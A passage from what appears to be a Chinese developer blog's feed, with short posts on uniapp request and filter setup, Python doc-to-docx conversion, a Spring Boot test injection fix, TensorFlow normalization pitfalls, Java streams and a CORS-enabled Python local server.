class="hljs-string">&#x27;@/api/api.js&#x27;</span>;<br><br><span class="hljs-title function_">getMenu2</span>(<span class="hljs-number">1</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> &#123;<br>    <span class="hljs-comment">// 经过拦截器的处理，进入到这里的请求都是成功请求，无需考虑请求失败的情况</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;res&#x27;</span>,res)<br>&#125;).<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span>=&gt;</span>&#123;<br>    <span class="hljs-comment">// 多数情况下，不需要写catch，因为拦截器已经进行了弹窗提示等操作</span><br>    <span class="hljs-comment">// 但当页面需要对错误进行处理时（例如关闭加载动画，取消按钮loading等），就需要在catch中操作</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;err&#x27;</span>,err)<br>&#125;)<br><br><span class="hljs-title function_">getMenu3</span>(&#123;<br>    <span class="hljs-attr">id</span>: <span class="hljs-number">1</span><br>&#125;).<span class="hljs-title function_">then</span>(<br>    ...<br>).<span class="hljs-title function_">catch</span>(<br>    ...<br>)<br><br><span class="hljs-title function_">postMenu</span>(&#123;<br>    <span class="hljs-attr">id</span>: <span class="hljs-number">1</span><br>&#125;).<span class="hljs-title function_">then</span>(<br>    ...<br>).<span class="hljs-title function_">catch</span>(<br>    ...<br>)<br></code></pre></td></tr></table></figure><h4 id="2-2-4-全局过滤器"><a href="#2-2-4-全局过滤器" class="headerlink" title="2.2.4 全局过滤器"></a>2.2.4 全局过滤器</h4><h5 id="2-2-4-1-定义"><a href="#2-2-4-1-定义" class="headerlink" title="2.2.4.1 定义"></a>2.2.4.1 定义</h5><p>全局过滤器定义在<code>/src/utils/filters.js</code>中，可参照其增加自己的过滤规则，常用定义方式如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 0-男,1-女</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">sexFilter</span> = (<span class="hljs-params">value</span>) =&gt; &#123;<br>    <span class="hljs-keyword">let</span> sexList = [<span class="hljs-string">&#x27;男&#x27;</span>, <span class="hljs-string">&#x27;女&#x27;</span>];<br>    <span class="hljs-keyword">return</span> sexList[value] ? sexList[value] : <span class="hljs-string">&quot;--&quot;</span>;<br>&#125;<br><br><span class="hljs-comment">// xx-小学及以下，cz-初中，gz-高中及以上</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">educationFilter</span> = (<span class="hljs-params">value</span>) =&gt; &#123;<br>    <span class="hljs-keyword">switch</span> (value) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;xx&#x27;</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;小学及以下&#x27;</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;cz&#x27;</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;初中&#x27;</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;gz&#x27;</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;高中及以上&#x27;</span>;<br>        <span class="hljs-attr">default</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;--&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;<br>    sexFilter,<br>    educationFilter<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="2-2-4-2-使用"><a href="#2-2-4-2-使用" class="headerlink" title="2.2.4.2 使用"></a>2.2.4.2 使用</h5><p>因为已经在<code>main.js</code>中定义如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">import</span> filters <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;@/utils/filters&#x27;</span>;<br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(filters).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">k</span> =&gt;</span> <span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">filter</span>(k, filters[k]));<br></code></pre></td></tr></table></figure><p>所以页面中无需引入，如下直接使用</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">view</span>&gt;</span>过滤器-性别：&#123;&#123; sex | sexFilter &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span><br></code></pre></td></tr></table></figure><p>效果：当<code>sex</code>为<code>0</code>，页面输出<code>男</code>；当<code>sex</code>为<code>1</code>，页面输出<code>女</code></p><blockquote><p>参考 <a href="https://www.uviewui.com/">uView</a>、<a href="https://uniapp.dcloud.net.cn/">uniapp</a></p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>前端</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python批量转化doc到docx</title>
    <link href="/2022/05/newpost-42/"/>
    <url>/2022/05/newpost-42/</url>
    
    <content type="html"><![CDATA[<h1 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h1><p>通过python批量转换doc文档为docx文档</p><span id="more"></span><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><h2 id="一、代码"><a href="#一、代码" class="headerlink" title="一、代码"></a>一、代码</h2><h3 id="windows下"><a href="#windows下" class="headerlink" title="windows下"></a>windows下</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> win32com <span class="hljs-keyword">import</span> client <span class="hljs-keyword">as</span> wc<br>word = wc.Dispatch(<span class="hljs-string">&quot;Word.Application&quot;</span>)<br>path = os.getcwd()<br><span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> os.listdir(path):<br>    <span class="hljs-keyword">if</span> file.endswith(<span class="hljs-string">&quot;.doc&quot;</span>):<br>        <span class="hljs-keyword">try</span>:<br>            file_path = path + <span class="hljs-string">&#x27;\\&#x27;</span> + file<br>            doc = word.Documents.Open(file_path)<br>            doc.SaveAs(<span class="hljs-string">&quot;&#123;&#125;x&quot;</span>.<span class="hljs-built_in">format</span>(file_path), <span class="hljs-number">12</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;成功:    &quot;</span> + file + <span class="hljs-string">&quot;   -&gt;  &quot;</span> + file + <span class="hljs-string">&quot;x&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;失败:    &quot;</span> + file + <span class="hljs-string">&quot;   -&gt;  &quot;</span> + file + <span class="hljs-string">&quot;x&quot;</span>)<br>        <span class="hljs-keyword">finally</span>:<br>            doc.Close()<br>word.Quit()<br><span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;输入回车结束...&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="Linux下（未经测试，失败烦请告知）"><a href="#Linux下（未经测试，失败烦请告知）" class="headerlink" title="Linux下（未经测试，失败烦请告知）"></a>Linux下（未经测试，失败烦请告知）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> subprocess<br>path = os.getcwd()<br><span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> os.listdir(path):<br>    <span class="hljs-keyword">if</span> file.endswith(<span class="hljs-string">&quot;.doc&quot;</span>):<br>        <span class="hljs-keyword">try</span>:<br>            file_path = path + <span class="hljs-string">&#x27;/&#x27;</span> + file<br>            subprocess.check_output([<span class="hljs-string">&quot;soffice&quot;</span>,<span class="hljs-string">&quot;--headless&quot;</span>,<span class="hljs-string">&quot;--invisible&quot;</span>,<span class="hljs-string">&quot;--convert-to&quot;</span>,<span class="hljs-string">&quot;docx&quot;</span>,file_path,<span class="hljs-string">&quot;--outdir&quot;</span>,path + <span class="hljs-string">&#x27;/&#x27;</span>])<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;成功:    &quot;</span> + file + <span class="hljs-string">&quot;   -&gt;  &quot;</span> + file + <span class="hljs-string">&quot;x&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;失败:    &quot;</span> + file + <span class="hljs-string">&quot;   -&gt;  &quot;</span> + file + <span class="hljs-string">&quot;x&quot;</span>)<br><span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;输入回车结束...&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="二、使用"><a href="#二、使用" class="headerlink" title="二、使用"></a>二、使用</h2><p>将以上内容写入main.py移动到需要转换的文档目录，运行<code>python main.py</code>，即可将当前目录下所有doc文件转docx</p>]]></content>
    
    
    
    <tags>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SpringBoot单元测试注入空指针</title>
    <link href="/2022/04/newpost-41/"/>
    <url>/2022/04/newpost-41/</url>
    
    <content type="html"><![CDATA[<h2 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h2><p>运行出现空指针异常，指向注入类的使用行</p><span id="more"></span><p>类似下边的单元测试，空指针异常指向<code>fileCategoryDictService.deleteFileCategoryDictById(6);</code>所在行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xxx.test;<br><br><span class="hljs-keyword">import</span> com.ifnxs.amp.textanalyse.web.biz.configmgr.service.FileCategoryDictService;<br><span class="hljs-keyword">import</span> org.junit.Test;<br><span class="hljs-keyword">import</span> org.springframework.boot.test.context.SpringBootTest;<br><br><span class="hljs-keyword">import</span> javax.annotation.Resource;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-meta">@SpringBootTest</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileCategoryDictTest</span> &#123;<br><br>    <span class="hljs-meta">@Resource</span><br>    <span class="hljs-keyword">private</span> FileCategoryDictService fileCategoryDictService;<br><br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 删除字典</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Test</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">delFileCategoryDict</span><span class="hljs-params">()</span> &#123;<br>        fileCategoryDictService.deleteFileCategoryDictById(<span class="hljs-number">6</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><ul><li><p>把<code>@Test</code>注解的引入由<code>import org.junit.Test;</code>改为<code>import org.junit.jupiter.api.Test;</code></p></li><li><p>如果由于特殊原因一定从<code>import org.junit.Test;</code>引入的，可以在<code>FileCategoryDictTest</code>类上加上<code>@RunWith(SpringJUnit4ClassRunner.class)</code>注解</p></li><li><p>还没解决，可以尝试<code>@SpringBootTest</code>加上参数填入<code>SpringBoot</code>启动类如<code>@SpringBootTest(classes=xxApplication.class)</code></p></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TensorFlow 预测出现NaN的一种可能以及解决方法</title>
    <link href="/2022/04/newpost-40/"/>
    <url>/2022/04/newpost-40/</url>
    
    <content type="html"><![CDATA[<h2 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h2><ul><li>使用TensorFlow进行训练（<code>model.fit</code>）时，一切正常，并且对测试数据集的预测结果（<code>model.evaluate</code>）也表现正常，这时候保存模型</li><li>对训练集中单独一条数据，或者少量数据进行预测，预测结果出现<code>NaN</code></li><li>如果对稍大量数据预测，则能正常出结果，但预测结果准确度低于预期</li><li>如果对大量数据预测，则结果准确度符合预期</li></ul><span id="more"></span><h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>经过分析，是由于训练和预测使用的归一化方法中使用的变量不一致导致的，训练和预测都是用下边的归一化方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">train_stats = train_dataset.describe().transpose()<br>train_stats_final = train_stats[[<span class="hljs-string">&#x27;mean&#x27;</span>, <span class="hljs-string">&#x27;std&#x27;</span>]]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">norm</span>(<span class="hljs-params">x</span>):<br><span class="hljs-keyword">return</span> (x - train_stats_final[<span class="hljs-string">&#x27;mean&#x27;</span>]) / train_stats_final[<span class="hljs-string">&#x27;std&#x27;</span>]<br></code></pre></td></tr></table></figure><p>但由于训练和预测的数据不一样，导致其<code>mean</code>和<code>std</code>值不同，尤其预测用数据量较少时，其值差别巨大，导致训练的模型不适用于预测时归一化出来的数据，最终预测结果出现<code>NaN</code>值</p><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>在训练保存模型时，同时对训练数据的<code>mean</code>和<code>std</code>值保存，在预测时使用</p><h3 id="1-保存"><a href="#1-保存" class="headerlink" title="1.保存"></a>1.保存</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">train_stats = train_dataset.describe().transpose()<br>train_stats_final = train_stats[[<span class="hljs-string">&#x27;mean&#x27;</span>, <span class="hljs-string">&#x27;std&#x27;</span>]]<br>train_stats_final.to_csv(<span class="hljs-string">&#x27;xxx.csv&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="2-使用"><a href="#2-使用" class="headerlink" title="2.使用"></a>2.使用</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">train_stats_final = pd.read_csv(<span class="hljs-string">&quot;xxx.csv&quot;</span>, index_col=<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Python</tag>
      
      <tag>机器学习</tag>
      
      <tag>TensorFlow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>随笔</title>
    <link href="/2022/04/newpost-39/"/>
    <url>/2022/04/newpost-39/</url>
    
    <content type="html"><![CDATA[<p>百年之后，假设我的博客还在，未来的人读到上边的文字，是否会想到，写下这些文字的人，已经死了</p>]]></content>
    
    
    
    <tags>
      
      <tag>随笔</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python归一化数据</title>
    <link href="/2022/03/newpost-38/"/>
    <url>/2022/03/newpost-38/</url>
    
    <content type="html"><![CDATA[<h1 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h1><p>使用python对pandas拿到的数据进行归一化，方便用于训练或者预测</p><span id="more"></span><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><p>数据来源：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><br>dataset = pd.read_csv(<span class="hljs-string">&quot;data/boston.csv&quot;</span>)<br></code></pre></td></tr></table></figure><h4 id="1-均值方差归一化（推荐）"><a href="#1-均值方差归一化（推荐）" class="headerlink" title="1. 均值方差归一化（推荐）"></a>1. 均值方差归一化（推荐）</h4><p>适用于没明显边界，有可能存在极值的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">stats = dataset.describe().transpose()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">norm</span>(<span class="hljs-params">x</span>):<br>  <span class="hljs-keyword">return</span> (x - stats[<span class="hljs-string">&#x27;mean&#x27;</span>]) / stats[<span class="hljs-string">&#x27;std&#x27;</span>]<br>normed_data = norm(dataset)<br></code></pre></td></tr></table></figure><h4 id="2-最值归一化"><a href="#2-最值归一化" class="headerlink" title="2. 最值归一化"></a>2. 最值归一化</h4><p>适用于有边界为题的，如果存在极端的极值，会影响归一化的结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">norm</span>(<span class="hljs-params">x</span>):<br>  <span class="hljs-keyword">return</span> (x - x.<span class="hljs-built_in">min</span>()) / (x.<span class="hljs-built_in">max</span>() - x.<span class="hljs-built_in">min</span>())<br>normed_data = norm(dataset)<br></code></pre></td></tr></table></figure><p><strong>经过实际测试，采用第一种方法预测的数据更为准确（表现为mae更小，预测值与真实值更吻合。当然在特别的数据下，你可能得到截然相反的结果），所以更推荐第一种。</strong></p><p><strong>但当数据只有一条或者很少时，可能拿不到方差，这时可以采用第二种</strong></p><blockquote><p>参考：<a href="https://blog.csdn.net/qq_39871991/article/details/106941740">数据归一化(附简单实现和sklearn简单处理数据)</a></p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>Python</tag>
      
      <tag>机器学习</tag>
      
      <tag>TensorFlow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windows下python安装sasl遇到的问题及解决</title>
    <link href="/2022/03/newpost-37/"/>
    <url>/2022/03/newpost-37/</url>
    
    <content type="html"><![CDATA[<h1 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h1><p>windows下python安装sasl</p><span id="more"></span><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><p>直接pip安装可能失败，这里采用官网下载whl文件本地安装的方法（在此之前先安装pip install wheel）。</p><ol><li><p>执行下边的命令查看pip能够支持的文件版本及类型</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python -m pip debug --verbose<br></code></pre></td></tr></table></figure> <img src="/2022/03/newpost-37/image-20220330093632073.png" class="" title="image-20220330093632073"></li><li><p>去<a href="%5Bhttps://www.lfd.uci.edu/~gohlke/pythonlibs/#sasl">官网https://www.lfd.uci.edu/~gohlke/pythonlibs/#sasl</a>下载支持的版本</p> <img src="/2022/03/newpost-37/image-20220330093720269.png" class="" title="image-20220330093720269"></li><li><p>下载到Python安装目录的<code>Scripts</code>文件夹下，然后cmd到该目录，执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">pip install sasl-0.3.1-cp37-cp37m-win_amd64.whl<br></code></pre></td></tr></table></figure><p>找不到python安装目录的可以在cmd执行<code>where python</code></p></li></ol><blockquote><p>参考 <a href="https://www.jianshu.com/p/c67657db5a93">Windows下安装sasl</a></p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>编程</tag>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>将对象List中的某个字段放到新的List中[转载]</title>
    <link href="/2022/03/newpost-36/"/>
    <url>/2022/03/newpost-36/</url>
    
    <content type="html"><![CDATA[<h1 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h1><p>将对象List中的某个字段放到新的List中</p><span id="more"></span><p>转载自：<a href="https://blog.csdn.net/zhangzehai2234/article/details/88432386">list stream:将对象List中的某个字段放到新的List中</a></p><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>List&lt;TAdslot&gt; userList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br><span class="hljs-type">TAdslot</span> <span class="hljs-variable">adslot1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TAdslot</span>();<br>adslot1.setName(<span class="hljs-string">&quot;One&quot;</span>);<br>adslot1.setNameList(Lists.newArrayList(<span class="hljs-string">&quot;A&quot;</span>,<span class="hljs-string">&quot;B&quot;</span>,<span class="hljs-string">&quot;C&quot;</span>));<br><span class="hljs-type">TAdslot</span> <span class="hljs-variable">adslot2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TAdslot</span>();<br>adslot2.setName(<span class="hljs-string">&quot;Zero&quot;</span>);<br>adslot2.setNameList(Lists.newArrayList(<span class="hljs-string">&quot;D&quot;</span>,<span class="hljs-string">&quot;E&quot;</span>,<span class="hljs-string">&quot;F&quot;</span>));<br><span class="hljs-type">TAdslot</span> <span class="hljs-variable">adslot3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TAdslot</span>();<br>adslot3.setName(<span class="hljs-string">&quot;Two&quot;</span>);<br>adslot3.setNameList(Lists.newArrayList(<span class="hljs-string">&quot;H&quot;</span>,<span class="hljs-string">&quot;I&quot;</span>,<span class="hljs-string">&quot;J&quot;</span>));<br><span class="hljs-type">TAdslot</span> <span class="hljs-variable">adslot4</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TAdslot</span>();<br>adslot4.setName(<span class="hljs-string">&quot;Four&quot;</span>);<br>userList.add(adslot1);<br>userList.add(adslot2);<br>userList.add(adslot3);<br>userList.add(adslot4);<br><br>List&lt;String&gt; stringList = userList.stream().map(TAdslot::getName).collect(Collectors.toList());<br>System.out.println(stringList);<br><br>List&lt;String&gt; userListStr = userList.stream().map(TAdslot::getNameList).filter(Objects::nonNull).flatMap(List::stream).collect(Collectors.toList());<br>System.out.println(userListStr);<br>&#125;<br>&#125;<br><br><span class="hljs-meta">@Data</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">TAdslot</span> &#123;<br><span class="hljs-keyword">public</span> String name;<br><span class="hljs-keyword">public</span> List&lt;String&gt; nameList;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出结果：</p><blockquote><p>[One, Zero, Two, Four]<br>[A, B, C, D, E, F, H, I, J]</p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>编程</tag>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python http.server 本地服务支持跨域</title>
    <link href="/2022/02/newpost-35/"/>
    <url>/2022/02/newpost-35/</url>
    
    <content type="html"><![CDATA[<h1 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h1><p>Python 使用http.server启动本地服务支持跨域</p><span id="more"></span><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><h3 id="1-创建start-py，代码如下"><a href="#1-创建start-py，代码如下" class="headerlink" title="1. 创建start.py，代码如下"></a>1. 创建start.py，代码如下</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-comment"># Python 3</span><br>    <span class="hljs-keyword">from</span> http.server <span class="hljs-keyword">import</span> HTTPServer, SimpleHTTPRequestHandler, test <span class="hljs-keyword">as</span> test_orig<br>    <span class="hljs-keyword">import</span> sys<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">test</span> (*args):<br>        test_orig(*args, port=<span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">1</span>]) <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-number">8000</span>)<br><span class="hljs-keyword">except</span> ImportError: <span class="hljs-comment"># Python 2</span><br>    <span class="hljs-keyword">from</span> BaseHTTPServer <span class="hljs-keyword">import</span> HTTPServer, test<br>    <span class="hljs-keyword">from</span> SimpleHTTPServer <span class="hljs-keyword">import</span> SimpleHTTPRequestHandler<br> <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">CORSRequestHandler</span> (<span class="hljs-title class_ inherited__">SimpleHTTPRequestHandler</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">end_headers</span> (<span class="hljs-variable language_">self</span>):<br>        <span class="hljs-variable language_">self</span>.send_header(<span class="hljs-string">&#x27;Access-Control-Allow-Origin&#x27;</span>, <span class="hljs-string">&#x27;*&#x27;</span>)<br>        SimpleHTTPRequestHandler.end_headers(<span class="hljs-variable language_">self</span>)<br> <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    test(CORSRequestHandler, HTTPServer)<br></code></pre></td></tr></table></figure><h3 id="2-运行start-py，端口为8000"><a href="#2-运行start-py，端口为8000" class="headerlink" title="2. 运行start.py，端口为8000"></a>2. 运行start.py，端口为8000</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python start.py 8000<br></code></pre></td></tr></table></figure><h3 id="3-windows建立脚本一键启动"><a href="#3-windows建立脚本一键启动" class="headerlink" title="3. windows建立脚本一键启动"></a>3. windows建立脚本一键启动</h3><p>在当前目录下新建<code>runServer.bat</code>，填入第二步中的命令并保存，之后双击脚本即可运行</p><blockquote><p>参考<a href="https://www.cnblogs.com/zyh1994/p/11353214.html">python3 http.server 本地服务支持跨域</a></p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>运维</tag>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TensorFlow入门</title>
    <link href="/2022/02/newpost-33/"/>
    <url>/2022/02/newpost-33/</url>
    
